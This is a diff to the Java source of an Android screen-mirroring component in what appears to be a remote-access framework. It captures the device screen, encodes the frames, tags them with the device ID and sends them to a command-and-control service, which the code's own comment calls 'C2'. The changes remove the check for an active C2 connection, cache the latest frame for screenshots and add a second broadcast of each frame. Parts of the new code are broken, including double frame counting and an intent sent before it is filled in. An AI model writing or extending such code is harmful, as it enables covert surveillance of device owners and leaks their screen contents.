@@ -31,7 +31,7 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class ScreenMirrorHelper {
 
     private static final String TAG = "ScreenMirrorHelper";
-    
+
     // ==================== CONFIGURATION ====================
     private static final int QUALITY = 65;
     private static final long MIN_INTERVAL = 500;  // 2 FPS max
@@ -56,6 +56,7 @@ public class ScreenMirrorHelper {
     private int frameCount = 0;
     private int errorCount = 0;
     private boolean isInitialized = false;
+    private Bitmap lastFrame = null;  // ✅ Untuk menyimpan frame terakhir
 
     // ==================== SCREEN DIMENSIONS ====================
     private int screenWidth = 0;
@@ -70,39 +71,28 @@ public class ScreenMirrorHelper {
 
     // ==================== INITIALIZATION ====================
 
-    /**
-     * Initialize the helper with context
-     * Must be called before startScreenCapture()
-     */
     public void onCreate(Context ctx) {
         this.context = ctx;
         Log.d(TAG, "📱 onCreate called");
 
-        // Create background thread for image processing
         backgroundThread = new HandlerThread("ScreenMirrorThread");
         backgroundThread.start();
         backgroundHandler = new Handler(backgroundThread.getLooper());
 
-        // Main thread handler
         handler = new Handler(Looper.getMainLooper());
 
-        // Get screen dimensions
         getScreenDimensions();
 
         isInitialized = true;
         Log.d(TAG, "✅ ScreenMirrorHelper initialized");
         Log.d(TAG, "📱 Screen: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");
 
-        // Register with ServiceController
         ServiceController.setScreenMirrorHelper(this);
         Log.d(TAG, "✅ Registered with ServiceController");
     }
 
     // ==================== SCREEN DIMENSIONS ====================
 
-    /**
-     * Get screen dimensions from WindowManager
-     */
     private void getScreenDimensions() {
         try {
             if (context == null) {
@@ -123,7 +113,6 @@ public class ScreenMirrorHelper {
             screenHeight = metrics.heightPixels;
             screenDensity = metrics.densityDpi;
 
-            // Validate
             if (screenWidth <= 0 || screenHeight <= 0) {
                 setDefaultDimensions();
             }
@@ -136,9 +125,6 @@ public class ScreenMirrorHelper {
         }
     }
 
-    /**
-     * Set default dimensions as fallback
-     */
     private void setDefaultDimensions() {
         screenWidth = 1080;
         screenHeight = 1920;
@@ -148,44 +134,32 @@ public class ScreenMirrorHelper {
 
     // ==================== START SCREEN CAPTURE ====================
 
-    /**
-     * Start screen capture with MediaProjection
-     * 
-     * @param projection MediaProjection instance from user permission
-     */
     public synchronized void startScreenCapture(MediaProjection projection) {
         Log.d(TAG, "🔄 startScreenCapture called");
 
-        // ==================== VALIDATION CHECKS ====================
-
-        // Check if already capturing
         if (isCapturing.get()) {
             Log.d(TAG, "⚠️ Already capturing, ignoring start request");
             return;
         }
 
-        // Check if helper is initialized
         if (!isInitialized) {
             Log.e(TAG, "❌ Helper not initialized. Call onCreate() first");
             notifyMirrorError("Helper not initialized");
             return;
         }
 
-        // Check if projection is valid
         if (projection == null) {
             Log.e(TAG, "❌ MediaProjection is null");
             notifyMirrorError("MediaProjection is null");
             return;
         }
 
-        // Check if context is valid
         if (context == null) {
             Log.e(TAG, "❌ Context is null");
             notifyMirrorError("Context is null");
             return;
         }
 
-        // Validate dimensions
         if (screenWidth <= 0 || screenHeight <= 0) {
             getScreenDimensions();
             if (screenWidth <= 0 || screenHeight <= 0) {
@@ -196,21 +170,15 @@ public class ScreenMirrorHelper {
         Log.d(TAG, "📱 Screen: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");
 
         try {
-            // ==================== SETUP MEDIA PROJECTION ====================
-
             this.mediaProjection = projection;
 
-            // Register callback for when projection stops
             this.mediaProjection.registerCallback(new MediaProjection.Callback() {
                 @Override
                 public void onStop() {
                     Log.d(TAG, "🛑 MediaProjection stopped by system");
                     isCapturing.set(false);
-                    
-                    // Cleanup resources
                     cleanup();
 
-                    // Notify AgentService via ServiceController
                     AgentService service = ServiceController.getAgentService();
                     if (service != null) {
                         service.onMirrorStopped();
@@ -218,15 +186,11 @@ public class ScreenMirrorHelper {
                         Log.d(TAG, "📤 Mirror stopped callback sent via ServiceController");
                     } else {
                         Log.w(TAG, "⚠️ AgentService not available for stop callback");
-                        // Send broadcast as fallback
                         sendMirrorStatusBroadcast(false);
                     }
                 }
             }, backgroundHandler);
 
-            // ==================== SETUP IMAGE READER ====================
-
-            // Clean up any existing image reader
             if (imageReader != null) {
                 try {
                     imageReader.close();
@@ -236,12 +200,11 @@ public class ScreenMirrorHelper {
                 imageReader = null;
             }
 
-            // Create ImageReader with RGBA_8888 format
             imageReader = ImageReader.newInstance(
-                screenWidth,
-                screenHeight,
-                PixelFormat.RGBA_8888,
-                2  // Max images to keep
+                    screenWidth,
+                    screenHeight,
+                    PixelFormat.RGBA_8888,
+                    2
             );
 
             if (imageReader == null) {
@@ -251,9 +214,6 @@ public class ScreenMirrorHelper {
                 return;
             }
 
-            // ==================== SETUP VIRTUAL DISPLAY ====================
-
-            // Clean up any existing virtual display
             if (virtualDisplay != null) {
                 try {
                     virtualDisplay.release();
@@ -263,16 +223,15 @@ public class ScreenMirrorHelper {
                 virtualDisplay = null;
             }
 
-            // Create VirtualDisplay
             virtualDisplay = mediaProjection.createVirtualDisplay(
-                "LazyFramework_Mirror",
-                screenWidth,
-                screenHeight,
-                screenDensity,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader.getSurface(),
-                null,
-                backgroundHandler
+                    "LazyFramework_Mirror",
+                    screenWidth,
+                    screenHeight,
+                    screenDensity,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.getSurface(),
+                    null,
+                    backgroundHandler
             );
 
             if (virtualDisplay == null) {
@@ -282,15 +241,10 @@ public class ScreenMirrorHelper {
                 return;
             }
 
-            // ==================== SETUP IMAGE LISTENER ====================
-
-            // Set listener for new images
             imageReader.setOnImageAvailableListener(
-                this::processImage,
-                backgroundHandler
+                    this::processImage,
+                    backgroundHandler
             );
-
-            // ==================== UPDATE STATE ====================
 
             isCapturing.set(true);
             isPaused.set(false);
@@ -300,40 +254,28 @@ public class ScreenMirrorHelper {
             Log.d(TAG, "✅ Screen capture STARTED successfully");
             Log.d(TAG, "📊 VirtualDisplay: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");
 
-            // ==================== NOTIFY AGENT SERVICE ====================
-
-            // Get AgentService from ServiceController
             AgentService service = ServiceController.getAgentService();
 
             if (service != null) {
-                // Notify mirror started
                 service.onMirrorStarted();
                 Log.d(TAG, "📤 onMirrorStarted() called via ServiceController");
-
-                // Send mirror status
                 service.sendMirrorStatus(true);
                 Log.d(TAG, "📤 sendMirrorStatus(true) sent via ServiceController");
-
             } else {
                 Log.w(TAG, "⚠️ AgentService not available via ServiceController");
                 Log.w(TAG, "   Status: " + ServiceController.getDebugInfo());
 
-                // Try to register again
                 AgentService retryService = ServiceController.getAgentService();
                 if (retryService != null) {
                     retryService.onMirrorStarted();
                     retryService.sendMirrorStatus(true);
                     Log.d(TAG, "📤 Retry: Mirror status sent successfully");
                 } else {
-                    // Send broadcast as fallback
                     sendMirrorStatusBroadcast(true);
                     Log.d(TAG, "📤 Fallback: Mirror status broadcast sent");
                 }
             }
 
-            // ==================== START MONITOR ====================
-
-            // Start frame monitor
             startFrameMonitor();
 
         } catch (SecurityException e) {
@@ -354,7 +296,6 @@ public class ScreenMirrorHelper {
             cleanup();
             isCapturing.set(false);
 
-            // Try to recover
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 try {
                     Log.d(TAG, "🔄 Attempting recovery...");
@@ -373,9 +314,6 @@ public class ScreenMirrorHelper {
 
     // ==================== FRAME MONITOR ====================
 
-    /**
-     * Start monitoring frame count
-     */
     private void startFrameMonitor() {
         if (backgroundHandler == null) return;
 
@@ -391,7 +329,6 @@ public class ScreenMirrorHelper {
                     Log.w(TAG, "⚠️ No frames captured yet. Check if screen is active.");
                 }
 
-                // Schedule next check
                 if (isCapturing.get()) {
                     backgroundHandler.postDelayed(this, FRAME_MONITOR_INTERVAL);
                 }
@@ -401,105 +338,113 @@ public class ScreenMirrorHelper {
 
     // ==================== PROCESS IMAGE ====================
 
-    /**
-     * Process image from ImageReader
-     */
     private void processImage(ImageReader reader) {
-    if (!isCapturing.get() || isPaused.get()) {
-        return;
-    }
-
-    if (reader == null) {
-        Log.w(TAG, "⚠️ ImageReader is null in processImage");
-        return;
-    }
-
-    Image image = null;
-    try {
-        long now = System.currentTimeMillis();
-
-        // Throttle frame capture
-        if (now - lastCaptureTime < MIN_INTERVAL) {
-            return;
-        }
-        lastCaptureTime = now;
-
-        image = reader.acquireLatestImage();
-        if (image == null) {
-            Log.w(TAG, "⚠️ No image available in processImage");
+        if (!isCapturing.get() || isPaused.get()) {
             return;
         }
 
-        Log.d(TAG, "📸 Image acquired: " + image.getWidth() + "x" + image.getHeight());
+        if (reader == null) {
+            Log.w(TAG, "⚠️ ImageReader is null in processImage");
+            return;
+        }
 
-        // Convert image to bitmap
-        Bitmap bitmap = imageToBitmap(image);
-        if (bitmap == null) {
-            Log.w(TAG, "⚠️ Bitmap conversion failed");
-            errorCount++;
-            if (errorCount > MAX_RETRY) {
-                Log.w(TAG, "⚠️ Too many errors (" + errorCount + "), resetting...");
-                resetCapture();
+        Image image = null;
+        try {
+            long now = System.currentTimeMillis();
+
+            if (now - lastCaptureTime < MIN_INTERVAL) {
+                return;
             }
-            return;
-        }
+            lastCaptureTime = now;
 
-        Log.d(TAG, "🖼️ Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());
+            image = reader.acquireLatestImage();
+            if (image == null) {
+                Log.w(TAG, "⚠️ No image available in processImage");
+                return;
+            }
 
-        // Compress to JPEG
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, baos);
-        bitmap.recycle();
+            Log.d(TAG, "📸 Image acquired: " + image.getWidth() + "x" + image.getHeight());
 
-        byte[] jpegData = baos.toByteArray();
-        baos.close();
+            Bitmap bitmap = imageToBitmap(image);
+            if (bitmap == null) {
+                Log.w(TAG, "⚠️ Bitmap conversion failed");
+                errorCount++;
+                if (errorCount > MAX_RETRY) {
+                    Log.w(TAG, "⚠️ Too many errors (" + errorCount + "), resetting...");
+                    resetCapture();
+                }
+                return;
+            }
 
-        Log.d(TAG, "📦 JPEG size: " + jpegData.length + " bytes");
+            // ✅ SAVE LAST FRAME FOR SCREENSHOT
+            if (bitmap != null) {
+                if (lastFrame != null && !lastFrame.isRecycled()) {
+                    lastFrame.recycle();
+                }
+                lastFrame = bitmap.copy(bitmap.getConfig(), true);
+                Log.d(TAG, "💾 Last frame saved for screenshot (" + lastFrame.getWidth() + "x" + lastFrame.getHeight() + ")");
+            }
 
-        // Validate JPEG data
-        if (jpegData == null || jpegData.length < 1000) {
-            Log.w(TAG, "⚠️ JPEG data too small (" + (jpegData != null ? jpegData.length : 0) + " bytes), skipping");
-            return;
-        }
+            Log.d(TAG, "🖼️ Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());
 
-        // ✅ INCREMENT FRAME COUNT
-        frameCount++;
-        Log.d(TAG, "📊 Frame #" + frameCount + " captured, size: " + jpegData.length + " bytes");
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, baos);
+            bitmap.recycle();
 
-        // Send frame to C2
-        boolean sent = sendFrameToAgent(jpegData);
-        
-        // ✅ Reset error count on success
-        if (sent) {
-            errorCount = 0;
-            Log.d(TAG, "✅ Frame #" + frameCount + " processed successfully");
-        } else {
-            Log.w(TAG, "⚠️ Frame #" + frameCount + " failed to send");
+            byte[] jpegData = baos.toByteArray();
+            String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
+
+Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
+intent.putExtra("frame_data", base64);
+intent.putExtra("frame_number", frameCount++);
+intent.putExtra("timestamp", System.currentTimeMillis());
+
+context.sendBroadcast(intent);
+            baos.close();
+
+            Log.d(TAG, "📦 JPEG size: " + jpegData.length + " bytes");
+
+            if (jpegData == null || jpegData.length < 1000) {
+                Log.w(TAG, "⚠️ JPEG data too small (" + (jpegData != null ? jpegData.length : 0) + " bytes), skipping");
+                return;
+            }
+
+            //frameCount++;
+            frameCount++;
+int currentFrame = frameCount;
+
+intent.putExtra("frame_number", currentFrame);
+            Log.d(TAG, "📊 Frame #" + frameCount + " captured, size: " + jpegData.length + " bytes");
+
+            boolean sent = sendFrameToAgent(jpegData);
+
+            if (sent) {
+                errorCount = 0;
+                Log.d(TAG, "✅ Frame #" + frameCount + " processed successfully");
+            } else {
+                Log.w(TAG, "⚠️ Frame #" + frameCount + " failed to send");
+                errorCount++;
+            }
+
+        } catch (OutOfMemoryError e) {
+            Log.e(TAG, "❌ Out of memory: " + e.getMessage());
+            System.gc();
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Process image error: " + e.getMessage(), e);
             errorCount++;
-        }
-
-    } catch (OutOfMemoryError e) {
-        Log.e(TAG, "❌ Out of memory: " + e.getMessage());
-        System.gc();
-    } catch (Exception e) {
-        Log.e(TAG, "❌ Process image error: " + e.getMessage(), e);
-        errorCount++;
-    } finally {
-        if (image != null) {
-            try {
-                image.close();
-            } catch (Exception e) {
-                // Ignore
+        } finally {
+            if (image != null) {
+                try {
+                    image.close();
+                } catch (Exception e) {
+                    // Ignore
+                }
             }
         }
     }
-}
 
     // ==================== IMAGE TO BITMAP ====================
 
-    /**
-     * Convert Image to Bitmap
-     */
     private Bitmap imageToBitmap(Image image) {
         if (image == null) return null;
 
@@ -519,15 +464,11 @@ public class ScreenMirrorHelper {
             int pixelStride = planes[0].getPixelStride();
             int rowStride = planes[0].getRowStride();
 
-            // Create bitmap with ARGB_8888 format
             Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 
-            // Handle row padding if needed
             if (rowStride == pixelStride * width) {
-                // No padding, direct copy
                 bitmap.copyPixelsFromBuffer(buffer);
             } else {
-                // Copy with padding handling
                 ByteBuffer dstBuffer = ByteBuffer.allocate(width * height * 4);
                 for (int row = 0; row < height; row++) {
                     buffer.position(row * rowStride);
@@ -552,12 +493,9 @@ public class ScreenMirrorHelper {
 
     // ==================== SEND FRAME TO AGENT ====================
 
-    /**
-     * Send frame to AgentService via ServiceController
-     *
-     * @return
-     */
-    private boolean sendFrameToAgent(byte[] jpegData) {
+    // ScreenMirrorHelper.java - Ganti method sendFrameToAgent
+
+private boolean sendFrameToAgent(byte[] jpegData) {
     if (jpegData == null || jpegData.length == 0) {
         Log.w(TAG, "⚠️ JPEG data is null or empty");
         return false;
@@ -570,8 +508,7 @@ public class ScreenMirrorHelper {
             return false;
         }
 
-        Log.d(TAG, "📤 Frame #" + frameCount + " size: " + jpegData.length + " bytes, base64: " + base64.length() + " chars");
-
+        // ✅ BUAT JSON FRAME
         JSONObject json = new JSONObject();
         json.put("type", "response");
         json.put("agent_id", getAgentId());
@@ -589,15 +526,17 @@ public class ScreenMirrorHelper {
         json.put("result", result);
         String jsonString = json.toString();
 
-        // ✅ PRIORITAS: Kirim via ServiceController dulu
+        // ✅ KIRIM LANGSUNG KE AGENTSERVICE
         AgentService service = ServiceController.getAgentService();
-        if (service != null && service.isC2Connected()) {
+        
+        if (service != null) {
+            // Kirim via AgentService (langsung ke C2)
             service.sendRawData(jsonString);
-            Log.d(TAG, "✅ Frame " + frameCount + " sent via ServiceController (C2 connected)");
+            Log.d(TAG, "✅ Frame " + frameCount + " sent via AgentService (direct)");
             return true;
         }
 
-        // ✅ FALLBACK: Kirim via Broadcast
+        // ✅ FALLBACK: KIRIM VIA BROADCAST
         if (context != null) {
             Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
             intent.putExtra("frame_data", base64);
@@ -609,79 +548,62 @@ public class ScreenMirrorHelper {
             
             context.sendBroadcast(intent);
             Log.d(TAG, "✅ Frame " + frameCount + " sent via Broadcast (fallback)");
-            
-            // ✅ TAMBAHKAN: Cek apakah AgentService bisa menerima
-            if (service != null) {
-                Log.d(TAG, "  - AgentService exists, but C2 status: " + (service.isC2Connected() ? "Connected" : "Disconnected"));
-            } else {
-                Log.w(TAG, "  - AgentService is NULL!");
-            }
-            
             return true;
         }
 
         Log.e(TAG, "❌ No send method available for frame " + frameCount);
+        return false;
 
     } catch (Exception e) {
         Log.e(TAG, "❌ sendFrameToAgent error: " + e.getMessage(), e);
+        return false;
     }
-    return false;
 }
 
-// TAMBAHKAN METHOD INI:
-private void sendFrameViaBroadcast(String base64) {
-    try {
-        if (context == null) {
-            Log.w(TAG, "⚠️ Context null, cannot send broadcast");
-            return;
+    private void sendFrameViaBroadcast(String base64) {
+        try {
+            if (context == null) {
+                Log.w(TAG, "⚠️ Context null, cannot send broadcast");
+                return;
+            }
+
+            Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
+            intent.putExtra("data", base64);
+            //intent.putExtra("frame_data", base64);
+            intent.putExtra("width", screenWidth);
+            intent.putExtra("height", screenHeight);
+            intent.putExtra("frame_number", frameCount);
+            intent.putExtra("timestamp", System.currentTimeMillis());
+            intent.setPackage(context.getPackageName());
+
+            context.sendBroadcast(intent);
+
+            if (frameCount % 10 == 0) {
+                Log.d(TAG, "📤 Frame " + frameCount + " sent via broadcast");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Broadcast send error: " + e.getMessage());
         }
-        
-        Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
-        intent.putExtra("frame_data", base64);
-        intent.putExtra("width", screenWidth);
-        intent.putExtra("height", screenHeight);
-        intent.putExtra("frame_number", frameCount);
-        intent.putExtra("timestamp", System.currentTimeMillis());
-        intent.setPackage(context.getPackageName()); // Explicit untuk keamanan
-        
-        context.sendBroadcast(intent);
-        
-        if (frameCount % 10 == 0) {
-            Log.d(TAG, "📤 Frame " + frameCount + " sent via broadcast");
-        }
-    } catch (Exception e) {
-        Log.e(TAG, "Broadcast send error: " + e.getMessage());
     }
-}
 
     // ==================== CONTROL METHODS ====================
 
-    /**
-     * Pause screen capture
-     */
     public void pauseCapture() {
         isPaused.set(true);
         Log.d(TAG, "⏸️ Capture paused");
     }
 
-    /**
-     * Resume screen capture
-     */
     public void resumeCapture() {
         isPaused.set(false);
         Log.d(TAG, "▶️ Capture resumed");
     }
 
-    /**
-     * Stop screen capture
-     */
     public void stopScreenCapture() {
         Log.d(TAG, "⏹️ Stopping screen capture...");
         isCapturing.set(false);
         isPaused.set(false);
         cleanup();
 
-        // Notify AgentService via ServiceController
         AgentService service = ServiceController.getAgentService();
         if (service != null) {
             service.onMirrorStopped();
@@ -695,16 +617,12 @@ private void sendFrameViaBroadcast(String base64) {
 
     // ==================== RESET ====================
 
-    /**
-     * Reset capture on error
-     */
     private void resetCapture() {
         Log.d(TAG, "🔄 Resetting capture...");
         cleanup();
         errorCount = 0;
         isCapturing.set(false);
 
-        // Try to restart
         if (mediaProjection != null) {
             Log.d(TAG, "🔄 Attempting restart...");
             startScreenCapture(mediaProjection);
@@ -713,9 +631,6 @@ private void sendFrameViaBroadcast(String base64) {
 
     // ==================== CLEANUP ====================
 
-    /**
-     * Cleanup resources
-     */
     private void cleanup() {
         Log.d(TAG, "🧹 Cleaning up resources...");
 
@@ -739,7 +654,13 @@ private void sendFrameViaBroadcast(String base64) {
             Log.w(TAG, "Error closing ImageReader: " + e.getMessage());
         }
 
-        // Clear callbacks
+        // ✅ Clear last frame
+        if (lastFrame != null && !lastFrame.isRecycled()) {
+            lastFrame.recycle();
+            lastFrame = null;
+            Log.d(TAG, "✅ Last frame cleared");
+        }
+
         if (backgroundHandler != null) {
             backgroundHandler.removeCallbacksAndMessages(null);
         }
@@ -747,16 +668,18 @@ private void sendFrameViaBroadcast(String base64) {
         Log.d(TAG, "✅ Cleanup complete");
     }
 
-    /**
-     * Destroy the helper (final cleanup)
-     */
     public void destroy() {
         Log.d(TAG, "💀 Destroying ScreenMirrorHelper...");
 
-        // Stop capture if running
         stopScreenCapture();
 
-        // Cleanup threads
+        // ✅ Cleanup last frame
+        if (lastFrame != null && !lastFrame.isRecycled()) {
+            lastFrame.recycle();
+            lastFrame = null;
+            Log.d(TAG, "✅ Last frame recycled");
+        }
+
         if (backgroundThread != null) {
             try {
                 backgroundThread.quitSafely();
@@ -771,7 +694,6 @@ private void sendFrameViaBroadcast(String base64) {
             handler = null;
         }
 
-        // Release MediaProjection
         if (mediaProjection != null) {
             try {
                 mediaProjection.stop();
@@ -781,10 +703,8 @@ private void sendFrameViaBroadcast(String base64) {
             }
         }
 
-        // Clear ServiceController reference
         ServiceController.clearMirrorHelper();
 
-        // Clear context
         context = null;
         isInitialized = false;
 
@@ -793,61 +713,48 @@ private void sendFrameViaBroadcast(String base64) {
 
     // ==================== GETTERS ====================
 
-    /**
-     * Check if currently capturing
-     */
     public boolean isCapturing() {
         return isCapturing.get();
     }
 
-    /**
-     * Check if paused
-     */
     public boolean isPaused() {
         return isPaused.get();
     }
 
-    /**
-     * Get frame count
-     */
     public int getFrameCount() {
         return frameCount;
     }
 
-    /**
-     * Get screen width
-     */
     public int getScreenWidth() {
         return screenWidth;
     }
 
-    /**
-     * Get screen height
-     */
     public int getScreenHeight() {
         return screenHeight;
     }
 
+    // ✅ METHOD UNTUK AMBIL LAST FRAME UNTUK SCREENSHOT
+    public Bitmap getLastFrame() {
+        if (lastFrame != null && !lastFrame.isRecycled()) {
+            return Bitmap.createBitmap(lastFrame); // Return copy
+        }
+        return null;
+    }
+
     // ==================== HELPER METHODS ====================
 
-    /**
-     * Get agent ID from device settings
-     */
     private String getAgentId() {
         if (context == null) return "unknown";
         try {
             return Settings.Secure.getString(
-                context.getContentResolver(),
-                Settings.Secure.ANDROID_ID
+                    context.getContentResolver(),
+                    Settings.Secure.ANDROID_ID
             );
         } catch (Exception e) {
             return "unknown";
         }
     }
 
-    /**
-     * Send mirror status via broadcast as fallback
-     */
     private void sendMirrorStatusBroadcast(boolean active) {
         try {
             android.content.Intent intent = new android.content.Intent("com.lazyframework.MIRROR_STATUS_BROADCAST");
@@ -864,9 +771,6 @@ private void sendFrameViaBroadcast(String base64) {
         }
     }
 
-    /**
-     * Notify mirror error to AgentService
-     */
     private void notifyMirrorError(String error) {
         Log.e(TAG, "❌ Mirror error: " + error);
 
@@ -880,7 +784,6 @@ private void sendFrameViaBroadcast(String base64) {
             }
         }
 
-        // Also send broadcast
         try {
             android.content.Intent intent = new android.content.Intent("com.lazyframework.MIRROR_ERROR");
             intent.putExtra("error", error);
